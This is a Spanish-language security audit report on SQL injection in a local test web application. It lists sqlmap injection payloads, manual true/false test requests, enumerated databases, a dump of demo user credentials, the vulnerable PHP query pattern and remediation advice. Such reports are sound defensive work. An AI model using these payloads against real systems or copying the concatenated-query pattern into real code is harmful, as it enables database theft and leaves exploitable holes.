# Informe de Auditoría de Seguridad — SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30  
**Hora:** 15:22 UTC  
**Herramientas:** curl, sqlmap 1.10.2  

---

## Resumen Ejecutivo

Se identificó y explotó una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` del formulario de búsqueda de usuarios. La explotación permitió extraer la totalidad de la base de datos `sqli_demo`, incluyendo credenciales en texto plano de 8 usuarios.

---

## Descripción del Objetivo

La aplicación web expone un formulario en la raíz (`/`) que acepta un parámetro `id` vía GET para buscar usuarios en la base de datos. La tecnología del servidor es:

- **Sistema operativo:** Linux Debian  
- **Servidor web:** Apache 2.4.65  
- **Lenguaje:** PHP 8.1.33  
- **Base de datos:** MySQL >= 5.1 (MariaDB fork)  

---

## Vulnerabilidad Detectada

### SQL Injection en parámetro `id`

**Tipo:** SQL Injection (múltiples técnicas)  
**Parámetro:** `id` (GET)  
**Severidad:** 🔴 CRÍTICA  
**CVSS estimado:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  

#### Técnicas confirmadas por sqlmap:

| Técnica | Descripción |
|---------|-------------|
| Boolean-based blind | `OR NOT 9498=9498#` |
| Error-based | `EXTRACTVALUE` con `CONCAT` |
| Time-based blind | `SLEEP(5)` |
| UNION query | `UNION ALL SELECT NULL, CONCAT(...)#` |

#### Prueba manual de confirmación:

```
# Respuesta con dato válido (true):
GET /?id=1' AND 1=1-- -&Submit=Submit
→ Devuelve: ID: 1 / First name: John / Surname: Doe

# Sin respuesta (false):
GET /?id=1' AND 1=2-- -&Submit=Submit
→ No devuelve resultados (comportamiento diferencial confirmado)
```

---

## Explotación

### Bases de datos enumeradas

```
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo   ← base de datos de la aplicación
[*] sys
```

### Tablas en `sqli_demo`

```
+-------+
| users |
+-------+
```

### Volcado de la tabla `users`

```
+---------+---------------------+-------------+-----------+-----------+------------+
| user_id | email               | password    | username  | last_name | first_name |
+---------+---------------------+-------------+-----------+-----------+------------+
| 1       | admin@example.com   | password123 | admin     | Doe       | John       |
| 2       | jane@example.com    | secret456   | jsmith    | Smith     | Jane       |
| 3       | bob@example.com     | mypass789   | bjohnson  | Johnson   | Bob        |
| 4       | alice@example.com   | qwerty123   | awilliams | Williams  | Alice      |
| 5       | charlie@example.com | password    | cbrown    | Brown     | Charlie    |
| 6       | diana@example.com   | secure123   | ddavis    | Davis     | Diana      |
| 7       | eve@example.com     | hackme      | emiller   | Miller    | Eve        |
| 8       | frank@example.com   | admin123    | fwilson   | Wilson    | Frank      |
+---------+---------------------+-------------+-----------+-----------+------------+
```

> ⚠️ **Las contraseñas están almacenadas en texto plano**, lo que agrava significativamente el impacto de esta vulnerabilidad.

---

## Impacto

1. **Confidencialidad comprometida:** Extracción completa de credenciales de todos los usuarios, incluyendo el administrador.
2. **Integridad en riesgo:** Un atacante podría modificar o eliminar datos de la base de datos.
3. **Disponibilidad:** Posible denegación de servicio mediante consultas maliciosas o destrucción de datos.
4. **Escalada de privilegios:** Las credenciales del administrador (`admin` / `password123`) podrían permitir acceso a otras áreas del sistema.

---

## Causa Raíz

El código PHP construye la consulta SQL concatenando directamente el valor del parámetro `id` sin sanitización ni uso de consultas preparadas (prepared statements). Ejemplo del patrón vulnerable:

```php
// CÓDIGO VULNERABLE (patrón típico)
$query = "SELECT * FROM users WHERE user_id = '" . $_GET['id'] . "'";
```

---

## Recomendaciones

1. **Usar consultas preparadas (Prepared Statements):**
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
   $stmt->execute([$_GET['id']]);
   ```

2. **Validar y sanitizar entradas:** Verificar que el parámetro `id` sea estrictamente numérico antes de procesarlo.

3. **Principio de mínimo privilegio:** El usuario de base de datos de la aplicación no debería tener acceso a `information_schema` ni a otras bases de datos del sistema.

4. **Almacenar contraseñas con hash:** Utilizar algoritmos seguros como `bcrypt` o `Argon2` en lugar de texto plano.

5. **Implementar WAF:** Desplegar un Web Application Firewall para detectar y bloquear patrones de SQL injection.

6. **Manejo de errores:** No exponer mensajes de error de base de datos al usuario final.

---

## Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad **crítica de SQL Injection** que fue explotada exitosamente, permitiendo la extracción completa de la base de datos de usuarios con sus credenciales en texto plano. Se requiere corrección inmediata.
